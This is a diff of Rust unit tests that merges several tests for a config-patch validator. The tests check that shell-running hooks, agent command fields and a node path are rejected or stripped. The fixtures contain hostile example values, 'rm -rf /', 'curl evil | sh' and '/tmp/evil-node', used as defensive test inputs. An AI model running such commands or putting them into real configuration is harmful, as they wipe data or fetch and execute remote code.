@@ -155,35 +155,60 @@ mod tests {
     use super::*;
     use serde_json::json;
 
+    /// Every shape `validate_patch` refuses, and the rejection each returns.
     #[test]
-    fn unknown_section_rejected() {
+    fn validate_patch_rejects_unknown_malformed_and_invalid_shapes() {
         let err = validate_patch(&json!({"nope": {"x": 1}}), Scope::Global, true).unwrap_err();
         assert!(matches!(err, PatchRejection::UnknownSection(_)));
         assert_eq!(err.status_code(), 400);
-    }
 
-    #[test]
-    fn hooks_section_is_not_writable() {
-        // `hooks` runs shell commands and bypasses repo trust.
+        // `hooks` runs shell commands and bypasses repo trust, so it is not a
+        // known section on either scope.
         for scope in [Scope::Global, Scope::Profile] {
             let err = validate_patch(&json!({"hooks": {"on_start": "rm -rf /"}}), scope, true)
                 .unwrap_err();
             assert!(
                 matches!(err, PatchRejection::UnknownSection(ref s) if s == "hooks"),
-                "hooks must be rejected as unknown on {scope:?}, got {err:?}"
+                "{scope:?}"
             );
         }
-    }
 
-    #[test]
-    fn unknown_field_rejected() {
         let err = validate_patch(&json!({"session": {"made_up": true}}), Scope::Global, true)
             .unwrap_err();
         assert!(matches!(err, PatchRejection::UnknownField(ref p) if p == "session.made_up"));
+
+        let err =
+            validate_patch(&json!({"theme": "not-an-object"}), Scope::Global, true).unwrap_err();
+        assert!(matches!(err, PatchRejection::Malformed(_)));
+
+        let err = validate_patch(
+            &json!({"acp": {"default_agent": "  "}}),
+            Scope::Global,
+            true,
+        )
+        .unwrap_err();
+        assert!(matches!(err, PatchRejection::Invalid { .. }));
+        assert_eq!(err.status_code(), 400);
+
+        // A null leaf clears the field, so it skips validation.
+        assert!(validate_patch(
+            &json!({"acp": {"default_agent": null}}),
+            Scope::Profile,
+            true
+        )
+        .is_ok());
+
+        // `description` exists on a profile only.
+        assert!(validate_patch(&json!({"description": "x"}), Scope::Profile, true).is_ok());
+        let err = validate_patch(&json!({"description": "x"}), Scope::Global, true).unwrap_err();
+        assert!(matches!(err, PatchRejection::UnknownSection(ref s) if s == "description"));
     }
 
+    /// `strip_local_only` drops the host-execution surfaces (agent commands,
+    /// status-hook command lines, the ACP node path) and leaves the rest of the
+    /// same section intact, so what survives still validates.
     #[test]
-    fn agent_command_fields_are_stripped() {
+    fn strip_local_only_removes_host_execution_surfaces() {
         for field in [
             "agent_command_override",
             "agent_extra_args",
@@ -194,17 +219,11 @@ mod tests {
         ] {
             let mut body = json!({"session": {field: {"claude": "x"}, "yolo_mode_default": true}});
             strip_local_only(&mut body);
-            assert!(
-                body["session"].get(field).is_none(),
-                "session.{field} must be stripped, body: {body}"
-            );
+            assert!(body["session"].get(field).is_none(), "session.{field}");
             assert_eq!(body["session"]["yolo_mode_default"], json!(true));
             assert!(validate_patch(&body, Scope::Profile, true).is_ok());
         }
-    }
 
-    #[test]
-    fn status_hook_commands_are_stripped() {
         let mut body = json!({"status_hooks": {
             "on_running": "curl evil | sh",
             "on_idle": "x",
@@ -213,12 +232,15 @@ mod tests {
         }});
         strip_local_only(&mut body);
         for field in ["on_running", "on_idle", "on_change"] {
-            assert!(
-                body["status_hooks"].get(field).is_none(),
-                "status_hooks.{field} must be stripped, body: {body}"
-            );
+            assert!(body["status_hooks"].get(field).is_none(), "{field}");
         }
         assert_eq!(body["status_hooks"]["enabled"], json!(true));
+        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
+
+        let mut body = json!({"acp": {"show_tool_durations": true, "node_path": "/tmp/evil-node"}});
+        strip_local_only(&mut body);
+        assert!(body["acp"].get("node_path").is_none());
+        assert_eq!(body["acp"]["show_tool_durations"], json!(true));
         assert!(validate_patch(&body, Scope::Profile, true).is_ok());
     }
 
@@ -247,44 +269,6 @@ mod tests {
         ] {
             assert!(validate_patch(&body, Scope::Profile, false).is_ok());
         }
-    }
-
-    #[test]
-    fn description_is_profile_only() {
-        assert!(validate_patch(&json!({"description": "x"}), Scope::Profile, true).is_ok());
-        let err = validate_patch(&json!({"description": "x"}), Scope::Global, true).unwrap_err();
-        assert!(matches!(err, PatchRejection::UnknownSection(ref s) if s == "description"));
-    }
-
-    #[test]
-    fn invalid_value_rejected() {
-        let err = validate_patch(
-            &json!({"acp": {"default_agent": "  "}}),
-            Scope::Global,
-            true,
-        )
-        .unwrap_err();
-        assert!(matches!(err, PatchRejection::Invalid { .. }));
-        assert_eq!(err.status_code(), 400);
-    }
-
-    #[test]
-    fn null_leaf_clears_without_validation() {
-        assert!(validate_patch(
-            &json!({"acp": {"default_agent": null}}),
-            Scope::Profile,
-            true
-        )
-        .is_ok());
-    }
-
-    #[test]
-    fn acp_is_now_web_writable_except_node_path() {
-        let mut body = json!({"acp": {"show_tool_durations": true, "node_path": "/tmp/evil-node"}});
-        strip_local_only(&mut body);
-        assert!(body["acp"].get("node_path").is_none());
-        assert_eq!(body["acp"]["show_tool_durations"], json!(true));
-        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
     }
 
     #[test]
